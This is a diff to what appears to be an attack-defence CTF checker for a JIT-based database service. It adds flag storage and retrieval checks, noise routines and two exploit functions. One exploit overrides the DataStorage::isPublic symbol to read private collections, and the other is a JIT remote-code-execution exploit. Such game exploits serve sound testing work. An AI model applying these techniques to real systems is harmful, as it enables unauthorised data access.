@@ -1,8 +1,9 @@
 import json
 import os
+from contextlib import contextmanager
 from functools import wraps
 from logging import LoggerAdapter
-from typing import Callable, TypeVar, ParamSpec, Awaitable
+from typing import Callable, TypeVar, ParamSpec, Awaitable, Generator
 
 from enochecker3 import (
     ChainDB,
@@ -22,7 +23,7 @@ from httpx import AsyncClient
 
 from client import JitterishClient
 from utils import *
-from codegen import CodeGenerator, Context, StringConst, expr_value, Collection
+from codegen import CodeGenerator, Context, StringConst, expr_value, Collection, Function
 
 T = TypeVar("T")
 P = ParamSpec("P")
@@ -43,6 +44,16 @@ def handle_invalid_response_exceptions(f: Callable[P, Awaitable[T]]) -> Callable
     return wrapper
 
 
+@contextmanager
+def log_code_on_error(logger: LoggerAdapter, query: Function) -> Generator[None, None, None]:
+    try:
+        yield
+    except:
+        print(query.as_script())
+        logger.info(f"Here's what we submitted: {query.as_script()}")
+        raise
+
+
 @checker.putflag(0)
 @handle_invalid_response_exceptions
 async def putflag_enterprise(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
@@ -59,11 +70,11 @@ async def putflag_enterprise(task: PutflagCheckerTaskMessage, logger: LoggerAdap
                           'enterprise')
 
     for _ in range(random.randint(0, 2)):
-        await client.api_create(username, CodeGenerator({}).any_expr.generate(Context()).value)
+        await client.api_create(username, CodeGenerator().any_expr.generate(Context()).value)
     key = await client.api_create(username, {'flag': task.flag, 'ident': task.task_id})
     logger.info(f'key = {key}')
     for _ in range(random.randint(0, 1)):
-        await client.api_create(username, CodeGenerator({}).any_expr.generate(Context()).value)
+        await client.api_create(username, CodeGenerator().any_expr.generate(Context()).value)
     token = generate_token()
     logger.info(f'token = {key}')
     grant_result = await client.api_grant(username, key, token)
@@ -147,44 +158,98 @@ async def getflag_community(task: GetflagCheckerTaskMessage, logger: LoggerAdapt
     client = JitterishClient(logger, httpclient)
     await client.login(username, password)
 
+    # check collection is listed
+    collections = await client.db_list_collections(username)
+    assert_in(collection.name, collections, f"Collection {collection.name} missing in database {username}")
+
     # retrieve the flag with a random generated custom query
     gen = CodeGenerator()
+    function = gen.function_many(max_params=1, max_additional_funcs=2)
     query = gen.flag_query(collection)
-    param = query.params[0].value if query.params else None
-    try:
-        output, result = await client.db_query(username, query.code, query.name, param)
-        assert_equals(result, query.value, "Flag missing")
+    code = function.code.strip() + '\n\n' + query.code
+    if random.randint(1, 100) <= 20:
+        code = CodeGenerator.uglify(code)
+    with log_code_on_error(logger, query):
+        param = query.params[0].value if query.params else None
+        output, result = await client.db_query(username, code, query.name, param)
+        assert_equals(result, query.value, "Flag missing")  # "expected query result" should already contain the flag
+        assert_in(task.flag, repr(result), "Flag missing")  # but let's double-check to be sure
         assert_equals(output, query.output, "Query has wrong debug output")
-    except:
-        print(query.as_script())
-        logger.info(f"Here's what we submitted: {query.as_script()}")
-        raise
 
-    # TODO add additional code to query
-    # TODO run validate function in privileged mode
-
+    with log_code_on_error(logger, function):
+        param = function.params[0].value if function.params else None
+        output, result = await client.db_query(username, code, function.name, param)
+        assert_equals(result, function.value, "Wrong function result")
+        assert_equals(output, function.output, "Wrong function output")
 
 
 @checker.putnoise(0)
-async def putnoise(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB) -> None:
-    # await db.set("info", (username, wish, keyvals))
-    ...
+async def putnoise(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient, db: ChainDB) -> None:
+    """
+    "Community" account with public relation.
+    """
+    gen = CodeGenerator()
+    username = generate_username()
+    password = generate_password()
+    public_value: str = StringConst(gen).raw()
+    collection = gen.collection(public_value)
+
+    client = JitterishClient(logger, httpclient)
+    await client.register(username, password,
+                          generate_random_string(8, False), generate_random_string(8, False),
+                          'community')
+
+    # load some random data to our database
+    await client.get(f'/database/{username}')
+    for item in collection.items:
+        await client.db_append(username, collection.name, expr_value(item))
+
+    await db.set("account", (username, password))
+    await db.set("collection", (username, collection.to_json(), public_value))
 
 
 @checker.getnoise(0)
-async def getnoise(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB,
+async def getnoise(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient, db: ChainDB,
                    di: DependencyInjector) -> None:
     try:
-        username, wish, keyvals = await db.get("info")
+        username, password = await db.get("account")
+        database, collection, public_value = await db.get("collection")
     except KeyError:
         raise MumbleException("Database info missing")
-    ...
+
+    # TODO load the putflag account if there's one
+
+    collection = Collection.from_json(collection)
+
+    gen = CodeGenerator()
+    query = gen.flag_query(collection)
+    function = gen.function_many(max_params=1)
+    code = function.code.strip() + '\n\n' + query.code
+    if random.randint(1, 100) <= 20:
+        code = CodeGenerator.uglify(code)
+
+    # login
+    client = JitterishClient(logger, httpclient)
+    await client.login(username, password)
+
+    # check collection exists
+    collections = await client.db_list_collections(database)
+    assert_in(collection.name, collections, f"Collection {collection.name} missing in database {database}")
+
+    # run the function & query
+    for f in (function, query):
+        with log_code_on_error(logger, f):
+            param = f.params[0].value if f.params else None
+            output, result = await client.db_query(database, code, f.name, param)
+            assert_equals(result, f.value, "Query output is wrong")
+            assert_equals(output, f.output, "Query result is wrong")
 
 
 @checker.havoc(0)
 async def havoc(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB,
                 di: DependencyInjector) -> None:
-    ...
+    await client.get('/')
+    await client.get('/docs')
 
 
 @checker.exploit(0)
@@ -215,7 +280,13 @@ async def exploit_jit(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, se
                       httpclient: AsyncClient) -> str | None:
     if task.attack_info == "":
         raise InternalErrorException("Missing attack info")
+    f1 = await exploit_jit_symbol_override(task.attack_info, logger, searcher, httpclient)
+    f2 = await exploit_jit_rce(task.attack_info, logger, searcher, httpclient)
+    return f1 if f1 == f2 else None  # tests should succeed iff both exploits worked
 
+
+async def exploit_jit_symbol_override(database: str, logger: LoggerAdapter, searcher: FlagSearcher,
+                                      httpclient: AsyncClient) -> str | None:
     # any account will do it
     client = JitterishClient(logger, httpclient)
     await client.register(generate_username(), generate_password(),
@@ -223,7 +294,7 @@ async def exploit_jit(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, se
                           'business')
 
     # get target collections
-    collections = await client.db_list_collections(task.attack_info)
+    collections = await client.db_list_collections(database)
     collections = [c for c in collections if 'private' in c]
     # this "function" will override the DataStorage::isPublic symbol from libjit_rt
     code = 'func _ZN11DataStorage8isPublicEv(){ return true; }\n'
@@ -231,17 +302,13 @@ async def exploit_jit(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, se
         code += f'query hack_{collection} on {collection};'
     data = ''
     for collection in collections:
-        _, result = await client.db_query(task.attack_info, code, f'hack_{collection}', None)
+        _, result = await client.db_query(database, code, f'hack_{collection}', None)
         data += json.dumps(result)
     return searcher.search_flag(data)
 
 
-@checker.exploit(2)
-async def exploit_jit_rce(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
-                      httpclient: AsyncClient) -> str | None:
-    if task.attack_info == "":
-        raise InternalErrorException("Missing attack info")
-
+async def exploit_jit_rce(database: str, logger: LoggerAdapter, searcher: FlagSearcher, httpclient: AsyncClient) -> str | None:
+    """this exploit does NOT work with a debug build of libjit_rt. Use the release/minsizerel builds."""
     # any account will do it
     client = JitterishClient(logger, httpclient)
     await client.register(generate_username(), generate_password(),
@@ -258,9 +325,8 @@ async def exploit_jit_rce(task: ExploitCheckerTaskMessage, logger: LoggerAdapter
         return 0;
     }
     '''.strip()
-    output, result = await client.db_query(task.attack_info, code, 'hack', None)
+    output, result = await client.db_query(database, code, 'hack', None)
     return searcher.search_flag(json.dumps(output) + json.dumps(result))
-
 
 
 if __name__ == "__main__":
